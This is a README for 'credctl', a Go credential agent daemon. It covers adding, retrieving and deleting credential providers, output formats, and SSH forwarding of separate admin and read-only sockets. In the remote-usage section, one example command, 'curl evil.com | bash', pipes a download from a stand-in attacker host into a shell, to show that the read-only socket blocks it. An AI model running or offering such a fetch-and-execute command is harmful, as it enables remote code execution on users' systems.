# credctl

A tiny SSH-forwardable credential agent for Unix systems (macOS/Linux).

## Overview

`credctl` is a credential agent daemon that executes commands to retrieve credentials on demand. It supports multiple output formats (raw, env variables, files) and provides secure remote access via SSH socket forwarding.

## Installation

```bash
go build -o credctl
```

## Quick Start

### 1. Start the daemon

```bash
eval $(credctl daemon)
```

This exports `CREDCTL_SOCK` and `CREDCTL_PID` environment variables.

### 2. Add credential providers

```bash
# Raw output (default)
credctl add mytoken "echo 'secret-token-123'"

# Environment variable format
credctl add myenv "echo 'value'" --format env --env-var MY_VAR

# File format
credctl add myfile "echo 'content'" --format file --file-path ~/.config/token
```

**Options:**
- `--format`: Output format (`raw`, `env`, `file`)
- `--env-var`: Variable name for env format
- `--file-path`: Destination path for file format  
- `--file-mode`: File permissions in octal (default: `0600`)

### 3. Get credentials

```bash
# Uses provider's configured format
credctl get mytoken            # Raw output
credctl get myenv              # export MY_VAR=value
credctl get myfile             # Writes to file

# Override format with --raw
credctl get myenv --raw        # Outputs raw value
```

### 4. Delete providers

```bash
credctl delete mytoken
```

## Remote Usage with SSH

The daemon creates two sockets:
- **Admin socket**: Full access (add, get, delete)
- **Read-only socket**: Only get operations

### Forward read-only socket for secure remote access

**On your local machine:**
```bash
eval $(credctl daemon)
credctl add mytoken "echo 'secret-123'" --format env --env-var TOKEN
```

**SSH with socket forwarding:**
```bash
ssh -R /home/user/.credctl/agent-readonly.sock:$HOME/.credctl/agent-readonly.sock user@remote
```

**On remote host:**
```bash
export CREDCTL_SOCK=/home/user/.credctl/agent-readonly.sock

# Get credentials (allowed)
credctl get mytoken             # ✓ Works

# Modify providers (blocked - prevents RCE)
credctl add malicious "curl evil.com | bash"  # ✗ Permission denied
```

By forwarding the read-only socket, remote systems can retrieve credentials but cannot execute arbitrary commands on your machine.